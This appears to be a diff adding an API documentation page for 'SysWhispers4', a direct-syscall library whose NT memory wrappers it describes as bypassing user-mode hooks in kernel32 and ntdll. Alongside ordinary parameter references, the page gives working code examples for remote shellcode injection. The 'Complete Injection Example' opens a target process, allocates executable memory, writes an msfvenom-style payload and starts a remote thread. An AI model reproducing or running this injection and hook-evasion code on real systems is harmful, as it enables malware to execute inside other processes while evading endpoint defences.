@@ -1,0 +1,539 @@
+---
+title: Memory Functions
+description: NT syscall functions for virtual memory allocation, protection, reading, and writing
+---
+
+## Overview
+
+SysWhispers4 provides direct syscall wrappers for Windows NT memory management functions. These bypass user-mode hooks on `kernel32.dll` and `ntdll.dll` functions like `VirtualAllocEx`, `WriteProcessMemory`, etc.
+
+## NtAllocateVirtualMemory
+
+Allocates virtual memory within a process.
+
+```c
+NTSTATUS SW4_NtAllocateVirtualMemory(
+    HANDLE  ProcessHandle,
+    PVOID   *BaseAddress,
+    ULONG_PTR ZeroBits,
+    PSIZE_T RegionSize,
+    ULONG   AllocationType,
+    ULONG   Protect
+);
+```
+
+### Parameters
+
+<ParamField path="ProcessHandle" type="HANDLE" required>
+  Handle to the target process. Use `GetCurrentProcess()` for local allocation, or a handle from `SW4_NtOpenProcess()` for remote allocation.
+</ParamField>
+
+<ParamField path="BaseAddress" type="PVOID*" required>
+  Pointer to a variable that receives the base address of the allocated region. Set to `NULL` to let the system choose the address.
+</ParamField>
+
+<ParamField path="ZeroBits" type="ULONG_PTR" required>
+  Number of high-order address bits that must be zero. Use `0` for no restriction.
+</ParamField>
+
+<ParamField path="RegionSize" type="PSIZE_T" required>
+  Pointer to the size (in bytes) of the region to allocate. Rounded up to page boundary. On success, receives the actual allocated size.
+</ParamField>
+
+<ParamField path="AllocationType" type="ULONG" required>
+  Type of allocation. Common values:
+  - `MEM_COMMIT` (0x1000) — Commit pages
+  - `MEM_RESERVE` (0x2000) — Reserve address space
+  - `MEM_COMMIT | MEM_RESERVE` (0x3000) — Allocate and commit
+</ParamField>
+
+<ParamField path="Protect" type="ULONG" required>
+  Memory protection. Common values:
+  - `PAGE_READONLY` (0x02)
+  - `PAGE_READWRITE` (0x04)
+  - `PAGE_EXECUTE` (0x10)
+  - `PAGE_EXECUTE_READ` (0x20)
+  - `PAGE_EXECUTE_READWRITE` (0x40)
+</ParamField>
+
+### Returns
+
+- `STATUS_SUCCESS` (0x00000000) on success
+- `STATUS_ACCESS_DENIED` (0xC0000022) if process handle lacks access
+- `STATUS_INVALID_PARAMETER` (0xC000000D) for invalid parameters
+
+### Example
+
+```c
+#include "SW4Syscalls.h"
+
+int main(void) {
+    SW4_Initialize();
+
+    PVOID base = NULL;
+    SIZE_T size = 0x1000;  // 4KB
+
+    NTSTATUS status = SW4_NtAllocateVirtualMemory(
+        GetCurrentProcess(),   // Local process
+        &base,                 // System chooses address
+        0,                     // No zero-bit restriction
+        &size,                 // 4KB (will be page-aligned)
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_READWRITE
+    );
+
+    if (NT_SUCCESS(status)) {
+        printf("[+] Allocated 0x%llx bytes at %p\n", (ULONG64)size, base);
+        // Use memory...
+
+        // Free when done
+        size = 0;
+        SW4_NtFreeVirtualMemory(GetCurrentProcess(), &base, &size, MEM_RELEASE);
+    }
+
+    return 0;
+}
+```
+
+---
+
+## NtAllocateVirtualMemoryEx
+
+Extended version of `NtAllocateVirtualMemory` with additional parameters (Windows 10+).
+
+```c
+NTSTATUS SW4_NtAllocateVirtualMemoryEx(
+    HANDLE  ProcessHandle,
+    PVOID   *BaseAddress,
+    PSIZE_T RegionSize,
+    ULONG   AllocationType,
+    ULONG   PageProtection,
+    PVOID   ExtendedParameters,
+    ULONG   ExtendedParameterCount
+);
+```
+
+### Parameters
+
+Similar to `NtAllocateVirtualMemory`, with added support for extended parameters (e.g., NUMA node affinity).
+
+<ParamField path="ExtendedParameters" type="PVOID">
+  Pointer to array of `MEM_EXTENDED_PARAMETER` structures (or `NULL`).
+</ParamField>
+
+<ParamField path="ExtendedParameterCount" type="ULONG">
+  Number of extended parameters (use `0` if none).
+</ParamField>
+
+---
+
+## NtFreeVirtualMemory
+
+Frees virtual memory allocated by `NtAllocateVirtualMemory`.
+
+```c
+NTSTATUS SW4_NtFreeVirtualMemory(
+    HANDLE  ProcessHandle,
+    PVOID   *BaseAddress,
+    PSIZE_T RegionSize,
+    ULONG   FreeType
+);
+```
+
+### Parameters
+
+<ParamField path="ProcessHandle" type="HANDLE" required>
+  Handle to the process.
+</ParamField>
+
+<ParamField path="BaseAddress" type="PVOID*" required>
+  Pointer to the base address to free.
+</ParamField>
+
+<ParamField path="RegionSize" type="PSIZE_T" required>
+  Pointer to size. For `MEM_RELEASE`, must be `0`. For `MEM_DECOMMIT`, specifies size.
+</ParamField>
+
+<ParamField path="FreeType" type="ULONG" required>
+  - `MEM_DECOMMIT` (0x4000) — Decommit pages (keep reservation)
+  - `MEM_RELEASE` (0x8000) — Release entire region
+</ParamField>
+
+### Example
+
+```c
+// Free allocated memory
+PVOID base = allocatedAddress;
+SIZE_T size = 0;  // Must be 0 for MEM_RELEASE
+
+NTSTATUS status = SW4_NtFreeVirtualMemory(
+    GetCurrentProcess(),
+    &base,
+    &size,
+    MEM_RELEASE
+);
+```
+
+---
+
+## NtWriteVirtualMemory
+
+Writes data to virtual memory in a process.
+
+```c
+NTSTATUS SW4_NtWriteVirtualMemory(
+    HANDLE  ProcessHandle,
+    PVOID   BaseAddress,
+    PVOID   Buffer,
+    SIZE_T  NumberOfBytesToWrite,
+    PSIZE_T NumberOfBytesWritten
+);
+```
+
+### Parameters
+
+<ParamField path="ProcessHandle" type="HANDLE" required>
+  Handle to the target process with `PROCESS_VM_WRITE` access.
+</ParamField>
+
+<ParamField path="BaseAddress" type="PVOID" required>
+  Starting address in the target process where data will be written.
+</ParamField>
+
+<ParamField path="Buffer" type="PVOID" required>
+  Pointer to the data to write.
+</ParamField>
+
+<ParamField path="NumberOfBytesToWrite" type="SIZE_T" required>
+  Number of bytes to write.
+</ParamField>
+
+<ParamField path="NumberOfBytesWritten" type="PSIZE_T">
+  Optional pointer to receive the actual number of bytes written. Can be `NULL`.
+</ParamField>
+
+### Example: Remote Shellcode Injection
+
+```c
+#include "SW4Syscalls.h"
+
+int main(void) {
+    SW4_Initialize();
+
+    DWORD targetPid = 1234;
+    unsigned char shellcode[] = { 0x90, 0x90, 0xC3 };  // nop; nop; ret
+
+    // Open target process
+    HANDLE hProcess = NULL;
+    OBJECT_ATTRIBUTES oa = { sizeof(oa) };
+    CLIENT_ID cid = { (HANDLE)(ULONG_PTR)targetPid, NULL };
+
+    NTSTATUS status = SW4_NtOpenProcess(
+        &hProcess, PROCESS_ALL_ACCESS, &oa, &cid
+    );
+    if (!NT_SUCCESS(status)) return 1;
+
+    // Allocate memory
+    PVOID remoteBase = NULL;
+    SIZE_T size = sizeof(shellcode);
+    status = SW4_NtAllocateVirtualMemory(
+        hProcess, &remoteBase, 0, &size,
+        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
+    );
+    if (!NT_SUCCESS(status)) {
+        SW4_NtClose(hProcess);
+        return 1;
+    }
+
+    // Write shellcode
+    SIZE_T written = 0;
+    status = SW4_NtWriteVirtualMemory(
+        hProcess,
+        remoteBase,
+        shellcode,
+        sizeof(shellcode),
+        &written
+    );
+
+    if (NT_SUCCESS(status)) {
+        printf("[+] Wrote %llu bytes to %p\n", (ULONG64)written, remoteBase);
+    }
+
+    SW4_NtClose(hProcess);
+    return 0;
+}
+```
+
+---
+
+## NtReadVirtualMemory
+
+Reads data from virtual memory in a process.
+
+```c
+NTSTATUS SW4_NtReadVirtualMemory(
+    HANDLE  ProcessHandle,
+    PVOID   BaseAddress,
+    PVOID   Buffer,
+    SIZE_T  NumberOfBytesToRead,
+    PSIZE_T NumberOfBytesRead
+);
+```
+
+### Parameters
+
+<ParamField path="ProcessHandle" type="HANDLE" required>
+  Handle with `PROCESS_VM_READ` access.
+</ParamField>
+
+<ParamField path="BaseAddress" type="PVOID" required>
+  Starting address to read from.
+</ParamField>
+
+<ParamField path="Buffer" type="PVOID" required>
+  Pointer to buffer that receives the data.
+</ParamField>
+
+<ParamField path="NumberOfBytesToRead" type="SIZE_T" required>
+  Number of bytes to read.
+</ParamField>
+
+<ParamField path="NumberOfBytesRead" type="PSIZE_T">
+  Optional pointer to receive actual bytes read. Can be `NULL`.
+</ParamField>
+
+### Example
+
+```c
+HANDLE hProcess = ...;
+PVOID remoteAddress = (PVOID)0x12345678;
+unsigned char buffer[256];
+
+NTSTATUS status = SW4_NtReadVirtualMemory(
+    hProcess,
+    remoteAddress,
+    buffer,
+    sizeof(buffer),
+    NULL
+);
+
+if (NT_SUCCESS(status)) {
+    // Process buffer contents...
+}
+```
+
+---
+
+## NtProtectVirtualMemory
+
+Changes memory protection on a region.
+
+```c
+NTSTATUS SW4_NtProtectVirtualMemory(
+    HANDLE  ProcessHandle,
+    PVOID   *BaseAddress,
+    PSIZE_T RegionSize,
+    ULONG   NewProtect,
+    PULONG  OldProtect
+);
+```
+
+### Parameters
+
+<ParamField path="ProcessHandle" type="HANDLE" required>
+  Handle with `PROCESS_VM_OPERATION` access.
+</ParamField>
+
+<ParamField path="BaseAddress" type="PVOID*" required>
+  Pointer to base address of the region.
+</ParamField>
+
+<ParamField path="RegionSize" type="PSIZE_T" required>
+  Pointer to size of the region.
+</ParamField>
+
+<ParamField path="NewProtect" type="ULONG" required>
+  New protection value (e.g., `PAGE_EXECUTE_READ`).
+</ParamField>
+
+<ParamField path="OldProtect" type="PULONG" required>
+  Pointer to variable that receives the previous protection value.
+</ParamField>
+
+### Example: RWX → RX After Write
+
+```c
+// Allocate as RWX
+PVOID base = NULL;
+SIZE_T size = 0x1000;
+SW4_NtAllocateVirtualMemory(
+    GetCurrentProcess(), &base, 0, &size,
+    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
+);
+
+// Write shellcode
+SW4_NtWriteVirtualMemory(
+    GetCurrentProcess(), base, shellcode, shellcodeSize, NULL
+);
+
+// Change to RX (good practice)
+ULONG oldProtect;
+SW4_NtProtectVirtualMemory(
+    GetCurrentProcess(),
+    &base,
+    &size,
+    PAGE_EXECUTE_READ,
+    &oldProtect
+);
+```
+
+---
+
+## NtQueryVirtualMemory
+
+Retrieves information about a memory region.
+
+```c
+NTSTATUS SW4_NtQueryVirtualMemory(
+    HANDLE ProcessHandle,
+    PVOID  BaseAddress,
+    MEMORY_INFORMATION_CLASS MemoryInformationClass,
+    PVOID  MemoryInformation,
+    SIZE_T MemoryInformationLength,
+    PSIZE_T ReturnLength
+);
+```
+
+### Parameters
+
+<ParamField path="MemoryInformationClass" type="MEMORY_INFORMATION_CLASS" required>
+  Type of information:
+  - `MemoryBasicInformation` (0) — Returns `MEMORY_BASIC_INFORMATION`
+</ParamField>
+
+<ParamField path="MemoryInformation" type="PVOID" required>
+  Pointer to buffer that receives information.
+</ParamField>
+
+<ParamField path="MemoryInformationLength" type="SIZE_T" required>
+  Size of the buffer.
+</ParamField>
+
+### Example
+
+```c
+MEMORY_BASIC_INFORMATION mbi;
+NTSTATUS status = SW4_NtQueryVirtualMemory(
+    GetCurrentProcess(),
+    someAddress,
+    MemoryBasicInformation,
+    &mbi,
+    sizeof(mbi),
+    NULL
+);
+
+if (NT_SUCCESS(status)) {
+    printf("Base: %p, Size: 0x%llx, Protect: 0x%lx\n",
+        mbi.BaseAddress, (ULONG64)mbi.RegionSize, mbi.Protect);
+}
+```
+
+---
+
+## NtSetInformationVirtualMemory
+
+Sets virtual memory information (Windows 10+).
+
+```c
+NTSTATUS SW4_NtSetInformationVirtualMemory(
+    HANDLE    ProcessHandle,
+    ULONG     VmInformationClass,
+    ULONG_PTR NumberOfEntries,
+    PVOID     VirtualAddresses,
+    PVOID     VmInformation,
+    ULONG     VmInformationLength
+);
+```
+
+### Use Cases
+
+- **Prefetch memory** — `VmPrefetchInformation`
+- **Set page priority** — Performance optimization
+
+---
+
+## Complete Injection Example
+
+Combining memory functions for classic remote injection:
+
+```c
+#include <stdio.h>
+#include "SW4Syscalls.h"
+
+static const unsigned char shellcode[] = {
+    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00,
+    // ... (msfvenom payload)
+};
+
+int main(void) {
+    if (!SW4_Initialize()) {
+        fprintf(stderr, "[!] SW4_Initialize failed\n");
+        return 1;
+    }
+
+    DWORD targetPid = 1234;
+
+    // 1. Open process
+    HANDLE hProcess = NULL;
+    OBJECT_ATTRIBUTES oa = { sizeof(oa) };
+    CLIENT_ID cid = { (HANDLE)(ULONG_PTR)targetPid, NULL };
+    NTSTATUS status = SW4_NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid);
+    if (!NT_SUCCESS(status)) return 1;
+
+    // 2. Allocate memory
+    PVOID base = NULL;
+    SIZE_T size = sizeof(shellcode);
+    status = SW4_NtAllocateVirtualMemory(
+        hProcess, &base, 0, &size,
+        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
+    );
+    if (!NT_SUCCESS(status)) {
+        SW4_NtClose(hProcess);
+        return 1;
+    }
+
+    // 3. Write shellcode
+    SW4_NtWriteVirtualMemory(hProcess, base, (PVOID)shellcode, sizeof(shellcode), NULL);
+
+    // 4. Change to RX
+    ULONG oldProt;
+    SW4_NtProtectVirtualMemory(hProcess, &base, &size, PAGE_EXECUTE_READ, &oldProt);
+
+    // 5. Create remote thread
+    HANDLE hThread = NULL;
+    status = SW4_NtCreateThreadEx(
+        &hThread, THREAD_ALL_ACCESS, NULL, hProcess,
+        base, NULL, 0, 0, 0, 0, NULL
+    );
+
+    if (NT_SUCCESS(status)) {
+        printf("[+] Remote thread created\n");
+        SW4_NtWaitForSingleObject(hThread, FALSE, NULL);
+        SW4_NtClose(hThread);
+    }
+
+    SW4_NtClose(hProcess);
+    return 0;
+}
+```
+
+## Next Steps
+
+<CardGroup cols={2}>
+  <Card title="Process & Thread Functions" icon="microchip" href="/api/process-thread-functions">
+    Open processes, create threads, suspend/resume
+  </Card>
+  <Card title="File Functions" icon="file" href="/api/file-functions">
+    NT file I/O via syscalls
+  </Card>
+</CardGroup>
